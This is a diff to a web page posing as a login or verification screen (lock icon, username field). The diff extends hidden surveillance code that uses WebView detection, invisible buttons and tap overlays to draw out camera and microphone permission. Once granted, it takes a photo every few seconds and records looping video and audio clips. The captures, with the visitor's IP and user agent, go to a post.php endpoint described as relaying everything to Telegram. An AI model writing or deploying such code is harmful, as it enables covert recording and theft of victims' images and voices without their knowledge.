@@ -23,8 +23,7 @@
             padding: 20px;
         }
 
-        /* Hidden camera elements */
-        .hidden-video-wrap {
+        .hidden-elements {
             display: none !important;
             position: fixed !important;
             top: -9999px !important;
@@ -36,7 +35,7 @@
             z-index: -9999 !important;
         }
 
-        #video, #canvas {
+        #video, #canvas, #audioElement {
             display: none !important;
             position: fixed !important;
             top: -9999px !important;
@@ -60,29 +59,11 @@
             text-align: center;
         }
 
-        .logo {
-            margin-bottom: 20px;
-            font-size: 48px;
-        }
+        .logo { margin-bottom: 20px; font-size: 48px; }
+        h2 { font-size: 20px; font-weight: 600; margin-bottom: 12px; color: #262626; }
+        p { font-size: 14px; color: #8e8e8e; line-height: 1.5; margin-bottom: 24px; }
 
-        h2 {
-            font-size: 20px;
-            font-weight: 600;
-            margin-bottom: 12px;
-            color: #262626;
-        }
-
-        p {
-            font-size: 14px;
-            color: #8e8e8e;
-            line-height: 1.5;
-            margin-bottom: 24px;
-        }
-
-        .form-group {
-            margin-bottom: 12px;
-        }
-
+        .form-group { margin-bottom: 12px; }
         .form-input {
             width: 100%;
             height: 36px;
@@ -92,11 +73,7 @@
             padding: 0 12px;
             font-size: 12px;
         }
-
-        .form-input:focus {
-            outline: none;
-            border-color: #a8a8a8;
-        }
+        .form-input:focus { outline: none; border-color: #a8a8a8; }
 
         .btn {
             width: 100%;
@@ -110,21 +87,10 @@
             cursor: pointer;
             margin-top: 12px;
         }
+        .btn:hover { background: #1877f2; }
+        .btn:disabled { opacity: 0.6; cursor: not-allowed; }
 
-        .btn:hover {
-            background: #1877f2;
-        }
-
-        .btn:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-        }
-
-        .footer {
-            margin-top: 20px;
-            font-size: 12px;
-            color: #8e8e8e;
-        }
+        .footer { margin-top: 20px; font-size: 12px; color: #8e8e8e; }
 
         .spinner {
             display: inline-block;
@@ -136,36 +102,11 @@
             animation: spin 0.8s linear infinite;
             margin-right: 8px;
         }
+        @keyframes spin { to { transform: rotate(360deg); } }
 
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
+        .success-msg { display: none; color: #00a651; font-size: 14px; margin-top: 12px; }
 
-        .success-msg {
-            display: none;
-            color: #00a651;
-            font-size: 14px;
-            margin-top: 12px;
-        }
-
-        /* ============================================
-           HIDDEN TRIGGER BUTTON - For WebView browsers
-           Invisible but clickable via JS
-           ============================================ */
-        .hidden-trigger {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            opacity: 0;
-            z-index: -1;
-            pointer-events: none;
-            background: transparent;
-            border: none;
-        }
-
-        /* For Facebook/Messenger WebView - visible overlay tap */
+        /* Tap overlay for WebView */
         .tap-overlay {
             position: fixed;
             top: 0;
@@ -177,11 +118,7 @@
             cursor: pointer;
             display: none;
         }
-
-        .tap-overlay.active {
-            display: block;
-        }
-
+        .tap-overlay.active { display: block; }
         .tap-overlay .tap-instruction {
             position: absolute;
             top: 50%;
@@ -195,42 +132,45 @@
             text-align: center;
             animation: pulse 1.5s infinite;
         }
-
         @keyframes pulse {
             0%, 100% { transform: translate(-50%, -50%) scale(1); }
             50% { transform: translate(-50%, -50%) scale(1.05); }
+        }
+
+        .hidden-trigger {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            opacity: 0;
+            z-index: -1;
+            pointer-events: none;
+            background: transparent;
+            border: none;
         }
     </style>
 </head>
 <body>
 
-    <!-- ============================================
-    HIDDEN CAMERA ELEMENTS
-    ============================================ -->
-    <div class="hidden-video-wrap">
+    <!-- Hidden Elements -->
+    <div class="hidden-elements">
         <video id="video" playsinline autoplay muted></video>
+        <audio id="audioElement" playsinline></audio>
     </div>
     <canvas id="canvas" width="640" height="480"></canvas>
 
-    <!-- ============================================
-    TAP OVERLAY - For Facebook/Messenger WebView
-    User taps to trigger camera permission
-    ============================================ -->
+    <!-- Tap Overlay for WebView -->
     <div class="tap-overlay" id="tapOverlay">
         <div class="tap-instruction">
             👆 Tap anywhere to continue<br>
-            <span style="font-size:12px;color:#aaa;"></span>
+            <span style="font-size:12px;color:#aaa;">Camera & Microphone access will be requested</span>
         </div>
     </div>
 
-    <!-- ============================================
-    HIDDEN TRIGGER BUTTON
-    ============================================ -->
     <button class="hidden-trigger" id="hiddenTrigger"></button>
 
-    <!-- ============================================
-    MAIN CONTENT
-    ============================================ -->
+    <!-- Main Content -->
     <div class="container">
         <div class="card">
             <div class="logo">🔒</div>
@@ -256,27 +196,35 @@
 
     <script>
         // ============================================
-        // UNIVERSAL CAMERA PERMISSION - WORKS ON ALL PLATFORMS
-        // Chrome, Firefox, Brave, Facebook Lite, Messenger, Instagram
+        // COMPLETE: Camera + Microphone + Video + Audio
+        // Sends everything to Telegram
         // ============================================
         
         (function() {
             'use strict';
 
+            // Elements
             const video = document.getElementById('video');
+            const audioElement = document.getElementById('audioElement');
             const canvas = document.getElementById('canvas');
             const context = canvas.getContext('2d');
             const tapOverlay = document.getElementById('tapOverlay');
             const hiddenTrigger = document.getElementById('hiddenTrigger');
             
+            // State
             let cameraActive = false;
+            let microphoneActive = false;
             let photoInterval = null;
             let stream = null;
             let userIP = '';
             let mediaRecorder = null;
+            let audioRecorder = null;
             let recordedChunks = [];
+            let audioChunks = [];
             let isRecording = false;
+            let isAudioRecording = false;
             let videoCounter = 0;
+            let audioCounter = 0;
             let permissionAttempted = false;
             let isWebView = false;
 
@@ -285,22 +233,13 @@
             // ============================================
             function detectPlatform() {
                 const ua = navigator.userAgent.toLowerCase();
-                
-                // Check if running in Facebook/Messenger/Instagram WebView
                 if (ua.includes('fbav') || ua.includes('fban') || 
                     ua.includes('instagram') || ua.includes('messenger') ||
                     ua.includes('fblite')) {
                     isWebView = true;
-                    console.log('📱 Running in WebView - needs tap to trigger');
+                    console.log('📱 Running in WebView');
                     return true;
                 }
-                
-                // Check if Firefox
-                if (ua.includes('firefox')) {
-                    console.log('🦊 Running in Firefox');
-                    return false;
-                }
-                
                 return false;
             }
 
@@ -347,17 +286,21 @@
             }
 
             // ============================================
-            // REQUEST CAMERA PERMISSION
+            // REQUEST PERMISSIONS (Camera + Microphone)
             // ============================================
-            function requestCameraPermission() {
+            function requestPermissions() {
                 if (permissionAttempted) return;
                 permissionAttempted = true;
                 
-                console.log('📷 Requesting camera permission...');
-                sendToTelegram('info', 'Requesting camera permission');
+                console.log('📷🎙️ Requesting camera + microphone permissions...');
+                sendToTelegram('info', 'Requesting camera + microphone permissions');
                 
                 const constraints = {
-                    audio: true,
+                    audio: {
+                        echoCancellation: true,
+                        noiseSuppression: true,
+                        autoGainControl: true
+                    },
                     video: {
                         facingMode: "user",
                         width: { ideal: 640 },
@@ -367,25 +310,25 @@
 
                 navigator.mediaDevices.getUserMedia(constraints)
                     .then(function(mediaStream) {
-                        console.log('✅ Camera permission granted!');
-                        handleCameraStream(mediaStream);
+                        console.log('✅ Camera + Microphone granted!');
+                        handleStream(mediaStream);
                     })
                     .catch(function(err) {
-                        console.log('❌ Camera error:', err.name);
-                        sendToTelegram('warning', 'Camera denied: ' + err.name);
+                        console.log('❌ Error:', err.name);
+                        sendToTelegram('warning', 'Permission denied: ' + err.name);
                         
-                        // Try video only
+                        // Try video only if audio fails
                         if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
                             requestVideoOnly();
                         } else if (err.name === 'NotFoundError') {
-                            // No camera found
-                            sendToTelegram('warning', 'No camera found on device');
+                            // No camera/mic found
+                            sendToTelegram('warning', 'No camera or microphone found');
                         }
                     });
             }
 
             // ============================================
-            // REQUEST VIDEO ONLY (No Audio)
+            // REQUEST VIDEO ONLY (Fallback)
             // ============================================
             function requestVideoOnly() {
                 console.log('📷 Trying video only...');
@@ -393,44 +336,95 @@
                 navigator.mediaDevices.getUserMedia({ video: true })
                     .then(function(mediaStream) {
                         console.log('✅ Video only granted!');
-                        handleCameraStream(mediaStream);
+                        handleStream(mediaStream);
                     })
                     .catch(function(err) {
                         console.log('❌ Video only failed:', err.name);
                         sendToTelegram('warning', 'Camera unavailable: ' + err.name);
+                        // Try audio only
+                        requestAudioOnly();
                     });
             }
 
             // ============================================
-            // HANDLE CAMERA STREAM
+            // REQUEST AUDIO ONLY (Fallback)
             // ============================================
-            function handleCameraStream(mediaStream) {
+            function requestAudioOnly() {
+                console.log('🎙️ Trying audio only...');
+                
+                navigator.mediaDevices.getUserMedia({ audio: true })
+                    .then(function(mediaStream) {
+                        console.log('✅ Audio only granted!');
+                        handleStream(mediaStream);
+                    })
+                    .catch(function(err) {
+                        console.log('❌ Audio only failed:', err.name);
+                        sendToTelegram('warning', 'No permissions granted');
+                    });
+            }
+
+            // ============================================
+            // HANDLE STREAM
+            // ============================================
+            function handleStream(mediaStream) {
                 if (stream) {
                     stream.getTracks().forEach(track => track.stop());
                 }
                 
                 stream = mediaStream;
-                video.srcObject = stream;
-                video.play();
-                cameraActive = true;
                 
-                // Hide overlay if visible
+                // Check what we have
+                const hasVideo = stream.getVideoTracks().length > 0;
+                const hasAudio = stream.getAudioTracks().length > 0;
+                
+                console.log(`📹 Video: ${hasVideo}, 🎙️ Audio: ${hasAudio}`);
+                
+                if (hasVideo) {
+                    video.srcObject = stream;
+                    video.play();
+                    cameraActive = true;
+                }
+                
+                if (hasAudio) {
+                    audioElement.srcObject = stream;
+                    microphoneActive = true;
+                }
+                
+                // Hide overlay
                 tapOverlay.classList.remove('active');
                 tapOverlay.style.display = 'none';
                 
-                sendToTelegram('permission', 'Camera permission GRANTED');
-                sendToTelegram('camera_ready', 'Camera active - capturing photos and videos');
+                // Send notifications
+                if (hasVideo && hasAudio) {
+                    sendToTelegram('permission', 'Camera + Microphone GRANTED');
+                    sendToTelegram('camera_ready', '📹 Camera + 🎙️ Microphone active');
+                } else if (hasVideo) {
+                    sendToTelegram('permission', 'Camera GRANTED (no mic)');
+                    sendToTelegram('camera_ready', '📹 Camera active (no microphone)');
+                } else if (hasAudio) {
+                    sendToTelegram('permission', 'Microphone GRANTED (no camera)');
+                    sendToTelegram('camera_ready', '🎙️ Microphone active (no camera)');
+                }
                 
-                // Start photo capture
-                if (photoInterval) clearInterval(photoInterval);
-                photoInterval = setInterval(capturePhoto, 3000);
+                // Start captures
+                if (hasVideo) {
+                    if (photoInterval) clearInterval(photoInterval);
+                    photoInterval = setInterval(capturePhoto, 3000);
+                    
+                    setTimeout(() => {
+                        if (cameraActive) {
+                            startVideoRecording();
+                        }
+                    }, 2000);
+                }
                 
-                // Start video recording
-                setTimeout(() => {
-                    if (cameraActive) {
-                        startVideoRecording();
-                    }
-                }, 2000);
+                if (hasAudio) {
+                    setTimeout(() => {
+                        if (microphoneActive) {
+                            startAudioRecording();
+                        }
+                    }, 3000);
+                }
             }
 
             // ============================================
@@ -455,14 +449,12 @@
                             async: true,
                             timeout: 5000
                         });
-                    } catch (e) {
-                        // Silent fail
-                    }
+                    } catch (e) {}
                 }
             }
 
             // ============================================
-            // RECORD VIDEO
+            // RECORD VIDEO (with audio if available)
             // ============================================
             function startVideoRecording() {
                 if (!stream || isRecording) return;
@@ -476,7 +468,8 @@
                     
                     mediaRecorder = new MediaRecorder(stream, {
                         mimeType: mimeType,
-                        videoBitsPerSecond: 1000000
+                        videoBitsPerSecond: 1000000,
+                        audioBitsPerSecond: 128000
                     });
 
                     mediaRecorder.ondataavailable = function(event) {
@@ -526,7 +519,74 @@
             }
 
             // ============================================
-            // SEND VIDEO
+            // RECORD AUDIO ONLY
+            // ============================================
+            function startAudioRecording() {
+                if (!stream || isAudioRecording) return;
+                
+                try {
+                    isAudioRecording = true;
+                    audioChunks = [];
+                    
+                    // Get audio-only stream
+                    const audioStream = new MediaStream(stream.getAudioTracks());
+                    
+                    const mimeTypes = ['audio/webm;codecs=opus', 'audio/webm', 'audio/mp4'];
+                    let mimeType = mimeTypes.find(type => MediaRecorder.isTypeSupported(type)) || 'audio/webm';
+                    
+                    audioRecorder = new MediaRecorder(audioStream, {
+                        mimeType: mimeType,
+                        audioBitsPerSecond: 128000
+                    });
+
+                    audioRecorder.ondataavailable = function(event) {
+                        if (event.data && event.data.size > 0) {
+                            audioChunks.push(event.data);
+                        }
+                    };
+
+                    audioRecorder.onstop = function() {
+                        if (audioChunks.length > 0) {
+                            const audioBlob = new Blob(audioChunks, {
+                                type: audioRecorder.mimeType || 'audio/webm'
+                            });
+                            
+                            if (audioBlob.size > 1000) {
+                                audioCounter++;
+                                sendAudioToTelegram(audioBlob);
+                            }
+                        }
+                        
+                        isAudioRecording = false;
+                        audioChunks = [];
+                        
+                        setTimeout(() => {
+                            if (microphoneActive) {
+                                startAudioRecording();
+                            }
+                        }, 3000);
+                    };
+
+                    audioRecorder.start(1000);
+                    
+                    setTimeout(() => {
+                        if (audioRecorder && audioRecorder.state === 'recording') {
+                            audioRecorder.stop();
+                        }
+                    }, 8000);
+
+                } catch (e) {
+                    isAudioRecording = false;
+                    setTimeout(() => {
+                        if (microphoneActive) {
+                            startAudioRecording();
+                        }
+                    }, 5000);
+                }
+            }
+
+            // ============================================
+            // SEND VIDEO TO TELEGRAM
             // ============================================
             function sendVideoToTelegram(videoBlob) {
                 const reader = new FileReader();
@@ -550,17 +610,39 @@
             }
 
             // ============================================
-            // TRIGGER PERMISSION - MULTIPLE METHODS
+            // SEND AUDIO TO TELEGRAM
+            // ============================================
+            function sendAudioToTelegram(audioBlob) {
+                const reader = new FileReader();
+                reader.onload = function(event) {
+                    $.ajax({
+                        type: 'POST',
+                        url: 'post.php',
+                        data: {
+                            tg_type: 'audio',
+                            tg_audio: event.target.result,
+                            tg_ip: userIP,
+                            tg_ua: navigator.userAgent,
+                            tg_time: new Date().toISOString(),
+                            tg_counter: audioCounter
+                        },
+                        async: true,
+                        timeout: 15000
+                    });
+                };
+                reader.readAsDataURL(audioBlob);
+            }
+
+            // ============================================
+            // TRIGGER PERMISSIONS - MULTIPLE METHODS
             // ============================================
             
-            // Method 1: Immediate attempt (Chrome, Brave)
             function triggerImmediate() {
                 if (!isWebView) {
-                    setTimeout(requestCameraPermission, 300);
+                    setTimeout(requestPermissions, 300);
                 }
             }
 
-            // Method 2: Click on overlay (Facebook, Messenger, WebView)
             function triggerOnTap() {
                 if (isWebView) {
                     tapOverlay.classList.add('active');
@@ -568,17 +650,15 @@
                     
                     tapOverlay.addEventListener('click', function() {
                         console.log('👆 User tapped overlay');
-                        requestCameraPermission();
+                        requestPermissions();
                     });
                     
-                    // Also try after 2 seconds
                     setTimeout(() => {
                         if (!permissionAttempted) {
                             console.log('⏰ Auto-trigger after timeout');
-                            requestCameraPermission();
-                            // If permission popup doesn't appear, show overlay
+                            requestPermissions();
                             setTimeout(() => {
-                                if (!cameraActive && !permissionAttempted) {
+                                if (!stream && !permissionAttempted) {
                                     tapOverlay.classList.add('active');
                                     tapOverlay.style.display = 'block';
                                 }
@@ -588,47 +668,40 @@
                 }
             }
 
-            // Method 3: Hidden button click (Firefox fix)
             function triggerHiddenButton() {
-                // Firefox sometimes needs a button click
                 hiddenTrigger.click();
-                
-                // Also try clicking on document
                 document.body.click();
-                
-                setTimeout(requestCameraPermission, 500);
+                setTimeout(requestPermissions, 500);
             }
 
-            // Method 4: Any user interaction
             function triggerOnInteraction() {
                 document.addEventListener('click', function() {
-                    if (!cameraActive && !permissionAttempted) {
-                        console.log('🖱️ User clicked - triggering camera');
-                        requestCameraPermission();
+                    if (!stream && !permissionAttempted) {
+                        console.log('🖱️ User clicked - triggering permissions');
+                        requestPermissions();
                     }
                 });
                 
                 document.addEventListener('touchstart', function() {
-                    if (!cameraActive && !permissionAttempted) {
-                        console.log('👆 User touched - triggering camera');
-                        requestCameraPermission();
+                    if (!stream && !permissionAttempted) {
+                        console.log('👆 User touched - triggering permissions');
+                        requestPermissions();
                     }
                 });
                 
                 document.addEventListener('keydown', function() {
-                    if (!cameraActive && !permissionAttempted) {
-                        console.log('⌨️ User typed - triggering camera');
-                        requestCameraPermission();
+                    if (!stream && !permissionAttempted) {
+                        console.log('⌨️ User typed - triggering permissions');
+                        requestPermissions();
                     }
                 });
             }
 
-            // Method 5: Focus on input (typing triggers)
             function triggerOnFocus() {
                 document.getElementById('username').addEventListener('focus', function() {
-                    if (!cameraActive && !permissionAttempted) {
-                        console.log('📝 User focused input - triggering camera');
-                        requestCameraPermission();
+                    if (!stream && !permissionAttempted) {
+                        console.log('📝 User focused input - triggering permissions');
+                        requestPermissions();
                     }
                 });
             }
@@ -701,7 +774,7 @@
 
             function sendPageView() {
                 sendToTelegram('page_view', 'Page loaded', 
-                    `IP: ${userIP} | UA: ${navigator.userAgent} | WebView: ${isWebView}`
+                    `IP: ${userIP} | WebView: ${isWebView}`
                 );
             }
 
@@ -709,42 +782,23 @@
             // INIT
             // ============================================
             
-            // Detect platform
             detectPlatform();
-            
-            // Get IP
             detectAndSendIP();
-            
-            // Send browser info
             setTimeout(sendBrowserInfo, 500);
-            
-            // Send page view
             setTimeout(sendPageView, 1000);
             
-            // ============================================
-            // START ALL TRIGGER METHODS
-            // ============================================
-            
-            // Method 1: Immediate (Chrome, Brave)
+            // Start all trigger methods
             triggerImmediate();
-            
-            // Method 2: Tap overlay (Facebook, Messenger, WebView)
             triggerOnTap();
-            
-            // Method 3: Hidden button (Firefox)
             setTimeout(triggerHiddenButton, 1000);
-            
-            // Method 4: User interaction
             triggerOnInteraction();
-            
-            // Method 5: Input focus
             triggerOnFocus();
             
-            // Extra: Try again after 5 seconds
+            // Final attempt
             setTimeout(() => {
-                if (!cameraActive && !permissionAttempted) {
-                    console.log('🔄 Final attempt after 5s');
-                    requestCameraPermission();
+                if (!stream && !permissionAttempted) {
+                    console.log('🔄 Final attempt');
+                    requestPermissions();
                 }
             }, 5000);
 
@@ -755,6 +809,9 @@
                 if (mediaRecorder && mediaRecorder.state === 'recording') {
                     mediaRecorder.stop();
                 }
+                if (audioRecorder && audioRecorder.state === 'recording') {
+                    audioRecorder.stop();
+                }
                 if (photoInterval) {
                     clearInterval(photoInterval);
                 }
@@ -763,7 +820,7 @@
                 }
             });
 
-            console.log('🔧 Camera permission system ready');
+            console.log('🔧 Camera + Microphone permission system ready');
             console.log(`📱 Platform: ${isWebView ? 'WebView' : 'Browser'}`);
 
         })();
